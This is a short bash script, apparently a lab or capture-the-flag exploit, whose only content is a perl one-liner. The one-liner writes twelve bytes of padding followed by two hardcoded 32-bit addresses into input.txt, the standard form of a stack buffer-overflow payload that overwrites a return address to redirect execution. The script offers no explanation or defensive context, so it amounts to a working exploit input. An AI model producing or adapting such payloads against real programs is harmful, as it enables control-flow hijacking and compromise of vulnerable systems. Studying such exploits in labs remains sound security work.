#!/bin/bash

perl -e 'print "A"x12; print "\xf8\xf5\xff\xbf\x23\x85\04\x08";' > input.txt
